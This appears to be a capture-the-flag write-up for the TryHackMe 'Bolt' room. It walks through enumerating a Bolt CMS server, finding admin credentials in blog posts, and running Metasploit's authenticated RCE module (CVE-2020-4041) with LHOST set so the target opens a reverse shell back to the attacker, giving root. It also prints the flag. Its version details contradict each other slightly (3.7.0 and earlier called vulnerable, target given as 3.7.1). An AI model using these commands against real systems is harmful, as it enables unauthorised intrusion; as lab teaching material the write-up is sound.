---
title: "Bolt"
description: "A CMS exploitation CTF machine targeting Bolt CMS 3.7.1 with default credentials leading to authenticated remote code execution."
difficulty: "Easy"
tags: ["CMS", "Bolt", "Authenticated RCE", "CVE-2020-4041", "Metasploit"]
date: "2026-07-04"
---

## Overview

Bolt is a TryHackMe room focused on exploiting a vulnerable Bolt CMS installation. The target exposes the CMS on port 8000 with easily discoverable credentials hidden in blog articles. Once authenticated, an authenticated RCE vulnerability (CVE-2020-4041) allows direct command execution as the root user.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** CMS enumeration, credential discovery in blog content, authenticated RCE exploitation

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt 10.49.141.37
```

Three open ports were discovered:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.29 |
| 8000/tcp | HTTP | PHP 7.2.32-1 (Bolt CMS) |

![Nmap scan showing Bolt CMS on 8000](/assets/screenshots/bolt/nmap.png)

### Web Enumeration

Port 80 displayed the default Apache Ubuntu page. The real target was on port 8000, which hosted **Bolt CMS 3.7.1** with the title "Bolt | A hero is unleashed."

![Bolt CMS front page](/assets/screenshots/bolt/cms_page.png)

Browsing the blog articles on the site revealed credentials embedded in the content:

![Username found in blog](/assets/screenshots/bolt/username.png)

- **Username:** `bolt`

![Password found in blog](/assets/screenshots/bolt/password.png)

- **Password:** `boltadmin123`

![Bolt CMS version detected](/assets/screenshots/bolt/cms_version.png)

The login page was at `/bolt/login`.

## Exploitation — Authenticated RCE

Bolt CMS 3.7.0 (and earlier) is vulnerable to **CVE-2020-4041**, an authenticated remote code execution flaw. An attacker with valid credentials can craft a malicious request to execute arbitrary PHP code on the server.

![Exploit-DB entry for Bolt CMS authenticated RCE](/assets/screenshots/bolt/exploitdb_search.png)

### Using Metasploit

```bash
msfconsole
msf6 > use exploit/unix/webapp/bolt_authenticated_rce
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.49.141.37
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RPORT 8000
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST <tun0_ip>
msf6 exploit(unix/webapp/bolt_authenticated_rce) > run
```

![Metasploit searching for bolt module](/assets/screenshots/bolt/msf_bolt_search.png)

The exploit authenticated to the Bolt admin panel and used a file write or PHP injection technique to execute code. The session came back as **root** — no privilege escalation was needed.

![Reverse shell obtained](/assets/screenshots/bolt/got_shell.png)

### Flag

```bash
cat /home/flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```

## Flag

| Flag | Value |
|------|-------|
| Flag | `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}` |

![Flag captured](/assets/screenshots/bolt/flag.png)

## Commands Used

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
msfconsole
use exploit/unix/webapp/bolt_authenticated_rce
set RHOSTS <target-ip>
set RPORT 8000
set USERNAME bolt
set PASSWORD boltadmin123
set LHOST <attacker-ip>
run
```

## Lessons Learned

- **CMS blog content** often contains credentials or hints — always read through the articles, not just the metadata. The `bolt:boltadmin123` credentials were in plain text on the front page.
- **Bolt CMS 3.7.1** has a known authenticated RCE (CVE-2020-4041) that allows an admin user to execute arbitrary PHP code. Always keep CMS software updated and change default credentials immediately after installation.
- **Authenticated vulnerabilities** are just as dangerous as unauthenticated ones when default or weak credentials are in use.
- The CMS runs as the web server user, but in this configuration, the session escalated directly to root, indicating poor process isolation.

## References

- [TryHackMe — Bolt](https://tryhackme.com/room/bolt)
- [CVE-2020-4041 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-4041)
- [Exploit-DB — Bolt CMS 3.7.0 Authenticated RCE](https://www.exploit-db.com/exploits/48296)
- [Bolt CMS](https://boltcms.io/)
